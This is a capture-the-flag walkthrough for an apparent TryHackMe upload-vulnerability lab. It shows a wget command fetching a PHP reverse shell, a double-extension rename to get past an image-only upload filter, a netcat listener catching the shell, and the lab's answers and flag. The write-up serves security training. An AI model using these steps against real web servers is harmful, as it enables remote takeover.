---
description: Web Exploitation - GET ; Upload ; Reverse Shell
---

# The Elf Strikes Back!

## Video

{% embed url="https://www.youtube.com/watch?v=F_nTIX-q32k&" %}

## Rooms

[Upload vulns](https://tryhackme.com/room/uploadvulns)

[Intro to Shells](https://tryhackme.com/room/introtoshells)

## Resources

[PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

## Challenge

Open the site

![](<../.gitbook/assets/image (7).png>)

> You have been assigned an ID number for your audit of the system: **`ODIzODI5MTNiYmYw`**
>
> http://10.10.236.79/?id=ODIzODI5MTNiYmYw

![](<../.gitbook/assets/image (8).png>)

### What string of text needs adding to the URL to get access to the upload page?

{% hint style="success" %}
?id=ODIzODI5MTNiYmYw
{% endhint %}

![](<../.gitbook/assets/image (9).png>)

### What type of file is accepted by the site?

{% hint style="success" %}
Image
{% endhint %}

Bypass the filter and upload a reverse shell.

```
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

mv php-reverse-shell.php image.jpeg.php
```

Change the following parameters in the file

![](<../.gitbook/assets/image (10).png>)

![](<../.gitbook/assets/image (11).png>)

Tried /uploads, /images, /media, /resources

![](<../.gitbook/assets/image (12).png>)

### In which directory are the uploaded files stored?

{% hint style="success" %}
/uploads/
{% endhint %}

![](<../.gitbook/assets/image (13).png>)

### Activate your reverse shell and catch it in a netcat listener!

{% hint style="success" %}
No answer needed
{% endhint %}

![](<../.gitbook/assets/image (14).png>)

### What is the flag in /var/www/flag.txt?

{% hint style="success" %}
THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}
{% endhint %}
